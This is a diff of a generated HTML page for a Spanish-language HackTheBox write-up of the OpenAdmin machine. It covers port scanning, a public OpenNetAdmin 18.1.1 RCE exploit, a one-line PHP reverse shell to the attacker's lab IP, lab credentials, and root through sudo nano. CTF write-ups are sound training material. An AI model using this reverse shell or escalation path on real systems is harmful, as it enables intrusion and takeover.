@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="Walkthrough :: Writeups de rooms y maquinas de TryHackMe, HackTheBox y CTFs, en español">
   
 
-<meta name="generator" content="Hugo 0.79.1" />
+<meta name="generator" content="Hugo 0.68.3" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1578,9 +1578,9 @@
   🏷️
   
 
-  <li><a href="https://sckull.github.io/tags/opennetadmin/" class="single__tag" title="OpenNetAdmin">#OpenNetAdmin</a></li>
-
   <li><a href="https://sckull.github.io/tags/nano/" class="single__tag" title="nano">#nano</a></li>
+
+  <li><a href="https://sckull.github.io/tags/opennetadmin/" class="single__tag" title="OpenNetAdmin">#OpenNetAdmin</a></li>
 
 </ul>
     </div>
@@ -1630,7 +1630,7 @@
 </tr>
 </tbody>
 </table>
-<h2 id="masscan--nmap">MASSCAN &amp; NMAP</h2>
+<h2 id="masscan--nmap-">MASSCAN &amp; NMAP</h2>
 <p>Escaneo de puertos tcp y servicios con masscan y nmap.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1696,10 +1696,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 <span class="c1"># Nmap done at Tue Jan  7 23:53:43 2020 -- 1 IP address (1 host up) scanned in 123.98 seconds</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="http">HTTP</h2>
+</div><h2 id="http-">HTTP</h2>
 <p>Pagina por default de Apache.<br />
 <img src="/images/posts/htb/openadmin/Screenshot_2020-01-08_00-02-04.webp" alt="image" /></p>
-<h3 id="gobuster---http">GOBUSTER - HTTP</h3>
+<h3 id="gobuster---http-">GOBUSTER - HTTP</h3>
 <p>Busqueda de directorios y archivos con gobuster.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1719,27 +1719,27 @@ Service detection performed. Please report any incorrect results at https://nmap
 /marga <span class="o">(</span>Status: 301<span class="o">)</span>
 </code></pre></td></tr></table>
 </div>
-</div><h3 id="music">/music</h3>
+</div><h3 id="music-">/music</h3>
 <p><img src="/images/posts/htb/openadmin/Screenshot_2020-01-08_19-37-40.webp" alt="image" /></p>
-<h3 id="sierra">/sierra</h3>
+<h3 id="sierra-">/sierra</h3>
 <p><img src="/images/posts/htb/openadmin/Screenshot_2020-01-08_19-38-03.webp" alt="image" /></p>
-<h3 id="marga">/marga</h3>
+<h3 id="marga-">/marga</h3>
 <p><img src="/images/posts/htb/openadmin/Screenshot_2020-01-08_19-38-47.webp" alt="image" /></p>
-<h3 id="artwork">/artwork</h3>
+<h3 id="artwork-">/artwork</h3>
 <p><img src="/images/posts/htb/openadmin/Screenshot_2020-01-08_19-39-21.webp" alt="image" /></p>
-<h2 id="opennetadmin-1811---remote-code-execution">OpenNetAdmin 18.1.1 - Remote Code Execution </h2>
+<h2 id="opennetadmin-1811---remote-code-execution--">OpenNetAdmin 18.1.1 - Remote Code Execution </h2>
 <p>En la pagina de <code>/music</code> encontramos que la pagina login nos redirige hacia otra pagina diferente (/ona), en la cual esta corriendo el gestor OpenNetAdmin en su version <code>18.1.1</code>.<br />
 <img src="/images/posts/htb/openadmin/Screenshot_2020-01-08_19-41-27.webp" alt="image" /></p>
 <p>Este gestor tiene una vulnerabilidad del tipo RCE y encontramos un exploit (<a href="https://www.exploit-db.com/exploits/47691"><strong>OpenNetAdmi - ExploitDB</strong></a> ) que aprovecha esta vulnerabilidad, ejecutamos dicho exploit pasandole la url como parametro.</p>
 <p><img src="/images/posts/htb/openadmin/Screenshot_2020-01-08_19-46-01.webp" alt="image" /></p>
-<h2 id="user---jimmy">USER - Jimmy</h2>
+<h2 id="user---jimmy-">USER - Jimmy</h2>
 <p>Ahora que podemos ejecutar comandos vamos a actualizar nuestra shell a una shell inversa utilizando PHP, descargando el archivo y abriendolo en el navegador para ejecutarlo.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.15.72/1227 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span>
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.15.72/1227 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Descargamos en la maquina:</p>
@@ -1759,7 +1759,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <img src="/images/posts/htb/openadmin/Screenshot_2020-01-08_19-51-24.webp" alt="image" /></p>
 <p>Credenciales:</p>
 <pre><code>jimmy:n1nj4W4rri0R!
-</code></pre><h2 id="user---joanna">USER - Joanna</h2>
+</code></pre><h2 id="user---joanna-">USER - Joanna</h2>
 <p>Dentro de la carpeta <code>/var/www/</code> donde usualmente se encuentran las paginas de apache, vemos que jimmy tiene permisos en una de las carpetas.<br />
 <img src="/images/posts/htb/openadmin/Screenshot_2020-01-08_19-52-59.webp" alt="image" /></p>
 <p>Cambiamos nuestra shell a SSH con el usuario Jimmy para poder enumerar los archivos dentro de la carpeta <code>/home</code> y <code>/var/www</code>.<br />
@@ -1798,7 +1798,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </code></pre><p>SSH Joanna:<br />
 Obtenemos una shell y nuestra flag <strong>user.txt</strong>.<br />
 <img src="/images/posts/htb/openadmin/Screenshot_2020-01-08_20-09-01.webp" alt="image" /></p>
-<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>
+<h2 id="privilege-escalation-">PRIVILEGE ESCALATION</h2>
 <p>Utilizamos sudo para ver los comandos que podemos utilizar sin contraseña, vemos que nano es uno de ellos, con la ayuda de <a href="https://gtfobins.github.io/gtfobins/nano/"><strong>GTFOBbins - nano</strong></a> obtenemos una shell commo root y con ello nuestra flag <strong>root</strong>.txt.</p>
 <p><img src="/images/posts/htb/openadmin/Screenshot_2020-01-08_20-12-30.webp" alt="image" /></p>
 <p>BTW Podemos agregar nuestra clave publica al archivo <code>authorized_keys</code> del usuario root e iniciar sesion con nuestra clave privada.<br />
@@ -3126,7 +3126,7 @@ document.addEventListener('DOMContentLoaded', function () {
             <p class="caption">
                 
                     
-                        ©2020, All Rights Reserved
+                        ©2021, All Rights Reserved
                     
                 
             </p>
@@ -3174,20 +3174,20 @@ document.addEventListener('DOMContentLoaded', function () {
             <li><a href="#informacion-de-la-maquina">Informacion de la Maquina</a></li>
           </ul>
         </li>
-        <li><a href="#masscan--nmap">MASSCAN &amp; NMAP</a></li>
-        <li><a href="#http">HTTP</a>
+        <li><a href="#masscan--nmap-">MASSCAN &amp; NMAP</a></li>
+        <li><a href="#http-">HTTP</a>
           <ul>
-            <li><a href="#gobuster---http">GOBUSTER - HTTP</a></li>
-            <li><a href="#music">/music</a></li>
-            <li><a href="#sierra">/sierra</a></li>
-            <li><a href="#marga">/marga</a></li>
-            <li><a href="#artwork">/artwork</a></li>
+            <li><a href="#gobuster---http-">GOBUSTER - HTTP</a></li>
+            <li><a href="#music-">/music</a></li>
+            <li><a href="#sierra-">/sierra</a></li>
+            <li><a href="#marga-">/marga</a></li>
+            <li><a href="#artwork-">/artwork</a></li>
           </ul>
         </li>
-        <li><a href="#opennetadmin-1811---remote-code-execution">OpenNetAdmin 18.1.1 - Remote Code Execution </a></li>
-        <li><a href="#user---jimmy">USER - Jimmy</a></li>
-        <li><a href="#user---joanna">USER - Joanna</a></li>
-        <li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
+        <li><a href="#opennetadmin-1811---remote-code-execution--">OpenNetAdmin 18.1.1 - Remote Code Execution </a></li>
+        <li><a href="#user---jimmy-">USER - Jimmy</a></li>
+        <li><a href="#user---joanna-">USER - Joanna</a></li>
+        <li><a href="#privilege-escalation-">PRIVILEGE ESCALATION</a></li>
       </ul>
     </li>
   </ul>
